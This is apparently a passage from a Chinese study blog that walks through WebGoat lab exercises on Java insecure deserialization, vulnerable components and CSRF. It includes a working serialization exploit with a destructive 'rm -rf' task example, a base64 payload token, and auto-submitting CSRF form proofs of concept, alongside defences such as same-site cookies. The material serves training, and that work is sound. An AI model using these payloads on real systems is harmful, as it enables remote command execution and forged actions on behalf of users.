+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">VulnerableTaskHolder</span> <span class="variable">go</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VulnerableTaskHolder</span>(<span class="string">&quot;delete all&quot;</span>, <span class="string">&quot;rm -rf somefile&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">oos.writeObject(go);</span><br><span class="line">oos.flush();</span><br><span class="line"><span class="type">byte</span>[] exploit = bos.toByteArray();</span><br></pre></td></tr></table></figure>
+
+<h3 id="Gadgets-Chain"><a href="#Gadgets-Chain" class="headerlink" title="Gadgets Chain"></a>Gadgets Chain</h3><p>一个在它自己执行反序列化时执行危险操作的类（这里称之为gadget）是很少见的<br>但是找到一个在反序列化时会作用到其他gadget的gadget却很常见<br>并通常会带来更多的作用效果<br>一个作用到下一个，直到真正的危险操作被执行<br>这一串类，我们称之为<strong>Gadgets Chain</strong></p>
+<blockquote>
+<p>It is weird (but it could happen) to find a gadget that runs dangerous actions itself when is deserialized. However, it is much easier to find a gadget that runs action on other gadget when it is deserializaded, and that second gadget runs more actions on a third gadget, and so on until a real dangerous action is triggered. That set of gadgets that can be used in a deserialization process to achieve dangerous actions is called “Gadget Chain”.</p>
+</blockquote>
+<p>寻找gadget来构筑可利用的gadgets chain是安全研究人员的一个热门话题<br>这通常需要大量的时间去阅读代码<br>（代码审计的工作&#x2F;目标之一？）</p>
+<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>一般反序列化题目只能白盒解决？<br>目前来说难度偏大</p>
+<p>开源项目直接去GitHub找源码<br>一般Java包可以解包？（直接改后缀为zip？）</p>
+<p>在GitHub上定位到如下文件：</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211012111819600.png" alt="image-20211012111819600"></p>
+<p>然后开始代码审计….</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211012112408397.png" alt="image-20211012112408397"></p>
+<p>框中的是解答成功的代码实现<br>箭头定位出要反序列化的对象为一个VulnerableTaskHolder实例<br>利用GitHub定位到VulnerableTaskHolder.java的代码</p>
+<p>这里的VulnerableTaskHolder类基本上是前面提到的同名类的拓展<br>其中的readObject()方法的关键地方如下：</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211012113342104.png" alt="image-20211012113342104"></p>
+<p>指出了只能使用sleep或ping命令来使系统延迟响应（防止Goat被玩坏）</p>
+<p>下面要做的就是</p>
+<ol>
+<li>构造一个VulnerableTaskHolder对象</li>
+<li>初始化taskAction为“sleep 6”来实现系统延迟响应</li>
+<li>把这个对象序列化</li>
+<li>把序列化后的数据按题目要求生成答案（具体参见源码或者<a href="#anchor1">前面的演示</a>）</li>
+</ol>
+<p>这里要求.java文件把包都指定为原定的org.dummy.insecure.framework<br>否则验证通不过</p>
+<p><del>得到EXP如下：</del><br><del>大体思路应该理解，但是token不对</del><br><del>怀疑是包指定的部分不对，得学习一下Java的包管理</del></p>
+<p><strong>关于Java指定包与编译</strong><br>例如两个.java文件都指定了如下的包：<br><code>package org.dummy.insecure.framework;</code><br>那么应该在org的上级目录处进行如下的编译：<br><code>javac ./org/dummy/insecure/framework/Main.java</code><br>然后这样运行：<br><code>java org/dummy/insecure/framework/Main</code><br>具体的个中原理，还得再练练</p>
+<p>完整exp如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// VulnerableTaskHolder.java</span></span><br><span class="line"><span class="keyword">package</span> org.dummy.insecure.framework;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableTaskHolder</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String taskName;</span><br><span class="line">    <span class="keyword">private</span> String taskAction;</span><br><span class="line">    <span class="keyword">private</span> LocalDateTime requestedExecutionTime;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VulnerableTaskHolder</span><span class="params">(String taskName, String taskAction)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.taskName = taskName;</span><br><span class="line">        <span class="built_in">this</span>.taskAction = taskAction;</span><br><span class="line">        <span class="built_in">this</span>.requestedExecutionTime = LocalDateTime.now();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;org.dummy.insecure.framework.VulnerableTaskHolder [taskName=&quot;</span> + taskName + <span class="string">&quot;, taskAction=&quot;</span> + taskAction + <span class="string">&quot;, requestedExecutionTime=&quot;</span></span><br><span class="line">                + requestedExecutionTime + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute a task when de-serializing a saved or received object.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> stupid develop</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">( ObjectInputStream stream )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//unserialize data so taskName and taskAction are available</span></span><br><span class="line">        stream.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//do something with the data</span></span><br><span class="line">        System.out.println(<span class="string">&quot;restoring task: &quot;</span>+taskName);</span><br><span class="line">        System.out.println(<span class="string">&quot;restoring time: &quot;</span>+requestedExecutionTime);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (requestedExecutionTime!=<span class="literal">null</span> &amp;&amp;</span><br><span class="line">                (requestedExecutionTime.isBefore(LocalDateTime.now().minusMinutes(<span class="number">10</span>))</span><br><span class="line">                        || requestedExecutionTime.isAfter(LocalDateTime.now()))) &#123;</span><br><span class="line">            <span class="comment">//do nothing is the time is not within 10 minutes after the object has been created</span></span><br><span class="line">            System.out.println(<span class="built_in">this</span>.toString());</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;outdated&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//condition is here to prevent you from destroying the goat altogether</span></span><br><span class="line">        <span class="keyword">if</span> ((taskAction.startsWith(<span class="string">&quot;sleep&quot;</span>)||taskAction.startsWith(<span class="string">&quot;ping&quot;</span>))</span><br><span class="line">                &amp;&amp; taskAction.length() &lt; <span class="number">22</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;about to execute: &quot;</span>+taskAction);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(taskAction);</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">                <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">while</span> ((line = in.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    System.out.println(line);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Main.java</span></span><br><span class="line"><span class="keyword">package</span> org.dummy.insecure.framework;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="comment">// import org.dummy.insecure.framework.VulnerableTaskHolder;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">VulnerableTaskHolder</span> <span class="variable">go</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VulnerableTaskHolder</span>(<span class="string">&quot;sleep&quot;</span>, <span class="string">&quot;sleep 5&quot;</span>);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">            oos.writeObject(go);</span><br><span class="line">            oos.flush();</span><br><span class="line">            <span class="type">byte</span>[] exploit = bos.toByteArray();</span><br><span class="line">            <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(exploit);</span><br><span class="line">            System.out.println(exp);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正确编译后运行，得到token：<br>rO0ABXNyADFvcmcuZHVtbXkuaW5zZWN1cmUuZnJhbWV3b3JrLlZ1bG5lcmFibGVUYXNrSG9sZGVyAAAAAAAAAAICAANMABZyZXF1ZXN0ZWRFeGVjdXRpb25UaW1ldAAZTGphdmEvdGltZS9Mb2NhbERhdGVUaW1lO0wACnRhc2tBY3Rpb250ABJMamF2YS9sYW5nL1N0cmluZztMAAh0YXNrTmFtZXEAfgACeHBzcgANamF2YS50aW1lLlNlcpVdhLobIkiyDAAAeHB3DgUAAAflChAJBjgf43PAeHQAB3NsZWVwIDV0AAVzbGVlcA&#x3D;&#x3D;</p>
+<h2 id="不安全组件"><a href="#不安全组件" class="headerlink" title="不安全组件"></a>不安全组件</h2><h3 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h3><p>Software Supply Chain<br>软件供应链<br>现代软件生产中所使用的开源组件流（flow）</p>
+<p><a target="_blank" rel="noopener" href="https://www.sonatype.com/hubfs/SSC/Software_Supply_Chain_Inforgraphic.pdf?t=1485298506170">简要介绍供应链及相关安全问题的介绍</a></p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211015095049421.png" alt="image-20211015095049421"></p>
+<p>大概就是<br>大部分现代生产中有80%~90%都是直接采用组件构成<br>很少原生代码编写</p>
+<p>组件版本迭代 × 新的开源项目 &#x3D; 每年数量高达31billion的组件需求<br>然而有6.8%的组件存在着至少一个已知的安全问题<br>旧版本组件更是有三倍的安全风险<br>这就是为什么一些公司严格保证<strong>供应链安全</strong>的原因<br>（防banner泄露、隐藏所用组件、隐藏组件来源及架构）</p>
+<p>提高供应链安全意识：</p>
+<ul>
+<li>使用更少人使用但更好的组件供应商</li>
+<li>只使用高质量的组件</li>
+<li>持续追踪组件的使用时间和地方</li>
+</ul>
+<p>WebGoat这里侧重强调：</p>
+<ul>
+<li>管理依赖库的困难</li>
+<li>不管理依赖库的风险</li>
+<li>以及发现依赖库是否存在风险的困难</li>
+</ul>
+<p>主要是要意识到【<strong>开源 ≠ 安全</strong>】，第三方代码和自己的代码一样重要<br>以及理解“确定和管理依赖树”在评定开源组件风险中的重要性</p>
+<h3 id="OWASP-Top-10-2021-A06"><a href="#OWASP-Top-10-2021-A06" class="headerlink" title="OWASP Top 10:2021 (A06)"></a>OWASP Top 10:2021 (A06)</h3><p>Vulnerable and Outdated Components<br>（使用）危险及过时组件</p>
+<p>如何减缓这类风险：</p>
+<ul>
+<li>移除不使用的依赖、不必要的特性、组件、文件和文档</li>
+<li>利用工具持续记录、检查前后端组件的版本<ul>
+<li>versions</li>
+<li>OWASP Dependency Check</li>
+<li>retire.js</li>
+</ul>
+</li>
+<li>持续对漏洞库进行镜像<ul>
+<li>CVE</li>
+<li>NVD</li>
+</ul>
+</li>
+<li>订阅所使用组件的安全问题公告</li>
+<li>仅使用安全链接从官方源获取组件，优先使用通过签名检查的包</li>
+<li>对不再维护或者不推出安全补丁的旧版本组件进行统计与镜像，或者是部署检测或防御系统</li>
+</ul>
+<hr>
+<p><strong>一个攻击场景</strong></p>
+<p>组件通常具有和使用其的应用相同的权限，因此组件出问题通常后果比较严重</p>
+<ul>
+<li>CVE-2017-5638</li>
+<li>物联网（internet of things， IoT）（物理）组件</li>
+</ul>
+<p>帮助寻找过期组件、错误配置系统以及有问题设备等的工具：</p>
+<ul>
+<li>Shodan IoT search engine</li>
+<li>FOFA</li>
+</ul>
+<p>演示了一下jquery-ui 1.10.4存在一个可利用的XSS</p>
+<h3 id="OWASP-Dependency-check"><a href="#OWASP-Dependency-check" class="headerlink" title="OWASP Dependency check"></a>OWASP Dependency check</h3><p>开源第三方组件检查工具</p>
+<p>一个部署场景：</p>
+<blockquote>
+<p>You can add OWASP Dependency check as a plugin to the pom.xml of a Maven project for instance.</p>
+<p>The plugin will download information from public vulnerability databases and it will check if vulnerable libraries are used and will indicate which vulnerability was reported.</p>
+<p>As part of a development pipeline, you can instruct the plugin to fail the build if there are violations that the development team was not aware of.</p>
+<p>Additionally you can use an xml file to waiver some of the violations.</p>
+<p>You should do so if the mentioned vulnerability cannot be exploited in your application.</p>
+</blockquote>
+<p>然后给出了WebGoat的实际部署情况及场景</p>
+<p>有些时候还包括了第三方组件<strong>授权</strong>的问题，即<strong>法律、风控安全</strong>？<br>自行修改？组件间授权不兼容？授权范围或完整？</p>
+<p>然后下一题，说只有在使用基于docker的WebGoat时才能做<br>是关于XStream的，<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2013-7285">CVE-2013-7285</a></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
+<li>现代产品中的开源组件使用不断增加</li>
+<li>开源组件来自于有着不同标准的不同库</li>
+<li>安全信息和问题普遍存在</li>
+<li>许可证书（License）问题很难验证</li>
+<li>大多数团队不注重甚至没有组件更新策略</li>
+<li><strong>开源组件成为新的攻击维度</strong></li>
+</ul>
+<p><strong>what to do?</strong></p>
+<ul>
+<li>使用<a target="_blank" rel="noopener" href="https://zh.lmgtfy.app/?q=OSS+bill+of+materials">自动化工具</a>构建自己的OSS物料清单（OSS Bill of Materials）</li>
+<li>在组织中针对开源代码的使用设置基线（Baseline）</li>
+<li>建设开源组件风险管理策略</li>
+</ul>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>Cross-Site Request Forgeries<br>跨站请求伪造<br>针对用户浏览器的“混淆代理（confused deputy）”攻击</p>
+<h3 id="概念-3"><a href="#概念-3" class="headerlink" title="概念"></a>概念</h3><p>别称：one-click attack、session riding（会话劫持）、XSRF</p>
+<blockquote>
+<p>A type of malicious exploit of a website where unauthorized commands are transmitted from a user that the website trusts.</p>
+</blockquote>
+<p><strong>与XSS的区别</strong><br>XSS：利用用户对特定站点的信任<br>CSRF：利用站点在用户浏览器中的信任</p>
+<p>一般有以下特点：</p>
+<ul>
+<li>涉及到了对用户身份存在依赖的网站</li>
+<li>利用了网站对这个身份的信任</li>
+<li>欺骗了用户浏览器，使其向站点发送HTTP请求</li>
+<li>涉及到了有副作用的HTTP请求</li>
+</ul>
+<p><strong>危害根源</strong>在于：<br>Web应用根据可信和经过身份验证的用户的输入或请求执行操作<br>而没有要求用户授权执行特定操作，或者是没有进一步认证用户授权</p>
+<p>一般不利用在“读操作”，因为攻击者收不到信息<br>多利用于“写操作”，故漏洞类型多列为“写类型CSRF”</p>
+<h3 id="第一道题目-1"><a href="#第一道题目-1" class="headerlink" title="第一道题目"></a>第一道题目</h3><p>抓包改改referer字段就有了</p>
+<h3 id="第二道题目-1"><a href="#第二道题目-1" class="headerlink" title="第二道题目"></a>第二道题目</h3><p>抓包改改referer字段又有了</p>
+<h3 id="来自框架的自动支持"><a href="#来自框架的自动支持" class="headerlink" title="来自框架的自动支持"></a>来自框架的自动支持</h3><p>大部分框架都默认有对防止CSRF攻击的支持</p>
+<p>例如在Angular中，拦截器从cookie中根据默认的XSRF-TOKEN读取toen，并将其设置为HTTP报头：X-XSRF-TOKEN<br>因为只有在你的域上运行的代码才能读取cookie<br>所以后端可以确定HTTP请求来自你的客户端应用程序，而不是攻击者</p>
+<p>这种情况下后端会把token设置在cookie中<br>为了在cookie中读数据，这时http-only标志位应该关闭<br>每次请求Angular都会在HTTP头部中设置X-XSRF-TOKEN</p>
+<p>因此后端能通过比较cookie以及header中的两个token<br>从而判断出这次请求是不是来自同一个域</p>
+<p>这里最重要的是，要定义单独的cookie，不要重复使用相同的session cookie<br>且session cookie总是要绑定http-only标志</p>
+<p>另外，自定义headers并不安全<br>除非所有和服务端的交互都是通过JS脚本进行的<br>（还附带了一个绕过的案例，可惜访问不了）</p>
+<h3 id="content-type和CSRF"><a href="#content-type和CSRF" class="headerlink" title="content-type和CSRF"></a>content-type和CSRF</h3><p>很多Web应用认为<br>通过仅使用application&#x2F;json作为content-type，就可以防御CSRF<br>原因是这种请求仅能通过XHR（XMLHttpRequest）请求生成<br>这样在发出正常请求之前，一个pre-flight request会先发送给服务端<br>若返回的pre-flight response不允许跨源（cross origin）请求<br>则浏览器不会发出随后的正常请求</p>
+<p>结论是：这样子不是一个有效防止CSRF攻击的措施<br>原因是：有一个很神奇的方法Navigator.sendBeacon()，允许指定任意content-type来发送POST数据<br>具体原因自己看去</p>
+<p>建议学一下HMLHttpRequest的内容</p>
+<h3 id="一道关于content-type的题目"><a href="#一道关于content-type的题目" class="headerlink" title="一道关于content-type的题目"></a>一道关于content-type的题目</h3><p>更多信息阅读<a target="_blank" rel="noopener" href="http://pentestmonkey.net/blog/csrf-xml-post-request">这里</a><br>讲的是利用<strong>把XML数据作为请求体的POST请求</strong>进行CSRF<br>里边比较关键的地方在于，作者想把XML数据作为恶意表单的name属性进行提交<br>但是其中的‘&lt;’等符号会被转义，并且还有关于请求体‘&#x3D;’的问题</p>
+<p>解决方法是，给恶意表单添加<br><code>ENCTYPE=&quot;text/plain&quot;</code><br>这一属性，使得特殊符号不再被转码，也解决的等号的问题</p>
+<p>POC看起来像是这个样子：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FORM</span> <span class="attr">NAME</span>=<span class="string">&quot;buy&quot;</span> <span class="attr">ENCTYPE</span>=<span class="string">&quot;text/plain&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">action</span>=<span class="string">&quot;http://trade.example.com/xmlrpc/trade.rem&quot;</span> <span class="attr">METHOD</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&#x27;&lt;?xml version&#x27;</span></span></span><br><span class="line"><span class="tag"><span class="attr">value</span>=<span class="string">&#x27;&quot;1.0&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;stocks.buy&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;MSFT&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;double&gt;26&lt;/double&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">FORM</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">buy</span>.<span class="title function_">submit</span>();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>回到题目</p>
+<p>很屌神奇，要自己抓包改掉content-type为text&#x2F;plain<br>然后改referer，就有了<br>可能和上面讲的原因有关<br>application&#x2F;json请求之前有一个预请求会对跨域进行检查</p>
+<p>看看别人的做法<br>比较正统的做法是：<br>构造一个恶意页面，生成恶意链接，诱导受害者点击，从而形成CSRF</p>
+<p>构造如下POC：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>try<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;attack&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;text/plain&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://www.webgoat.local:8080/WebGoat/csrf/feedback/message&quot;</span> <span class="attr">METHOD</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&#x27;&#123;&quot;name&quot;: &quot;Testf&quot;, &quot;email&quot;: &quot;teddst1233@163.com&quot;, &quot;subject&quot;: &quot;service&quot;, &quot;message&quot;:&quot;&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;dsaffd&quot;&#125;&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">attack</span>.<span class="title function_">submit</span>();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>放到WebWolf上，形成link，点击，搞定</p>
+<p>可能值得关注的是：</p>
+<ul>
+<li>通过恶意表单的name属性传递了json数据</li>
+<li>又通过<code>enctype=&quot;text/plain&quot;</code>属性逃避了预请求的发送</li>
+<li>妙啊</li>
+</ul>
+<h3 id="题目：Login-CSRF-attack"><a href="#题目：Login-CSRF-attack" class="headerlink" title="题目：Login CSRF attack"></a>题目：Login CSRF attack</h3><p>大概就是：<br>诱导受害人用攻击者的账号在某站点（搜索引擎、淘宝等）进行登录<br>使受害者绑定到攻击者的登录态<br>从而攻击者后续可以通过自己的账号收集受害者信息（访问记录等）</p>
+<p>图示如下：</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211016145231849.png" alt="image-20211016145231849"></p>
+<p>题目就是，创建另一个csrf-arcyxu账号<br>模拟用户登录了这个账号（而用户不知道）<br>用户点击解决按钮，此时攻击者知道了用户行为</p>
+<h3 id="CSRF的影响"><a href="#CSRF的影响" class="headerlink" title="CSRF的影响"></a>CSRF的影响</h3><p>只受到已登录的合法用户的权限限制<br>真正容易受到CSRF攻击影响的是<strong>物联网设备</strong>和一些<strong>“智能”设备</strong><br>很多消费者级路由器也被证明容易受CSRF影响</p>
+<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p><strong>same-site cookie attribute</strong></p>
+<p>现代浏览器能够支持一些扩展<br>能限制cookie的使用范围<br>使只有当请求是同站‘same-site’时<br>cookie才能被附加到这样的请求上</p>
+<p>例子：</p>
+<blockquote>
+<p>For example requests for <a target="_blank" rel="noopener" href="http://webgoat.org/something">http://webgoat.org/something</a> will attach same-site cookies if the request is initiated from webgoat.org.</p>
+</blockquote>
+<p>same-site cookie有分为严格模式和松散模式<br>更多可以阅读这里：<br><a target="_blank" rel="noopener" href="https://www.sjoerdlangkemper.nl/2016/04/14/preventing-csrf-with-samesite-cookie-attribute/">Preventing CSRF with the same-site cookie attribute</a></p>
+<hr>
+<p><strong>其他解决方案</strong></p>
+<p>现在很多（Web）应用框架都默认有处理CSRF攻击的支持<br>例如Spring和Tomcat<br>防御特性可以开关自定义控制</p>
+<p>最后是一些拓展阅读</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP CSRF防御备忘录</a></li>
+<li><a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/csrf">OWASP CSRF攻击</a></li>
+<li><a target="_blank" rel="noopener" href="https://tomcat.apache.org/tomcat-8.0-doc/config/filter.html#CSRF_Prevention_Filter">Tomcat 8.0的CSRF防御过滤文档</a>&#x2F;<a target="_blank" rel="noopener" href="https://tomcat.apache.org/tomcat-7.0-doc/config/filter.html#CSRF_Prevention_Filter">Tomcat 7.0的CSRF防御过滤文档</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.spring.io/spring-security/site/docs/current/reference/html5/#csrf">Spring 的CSRF防御文档</a></li>
+</ul>
+<p>优先阅读前面两个</p>
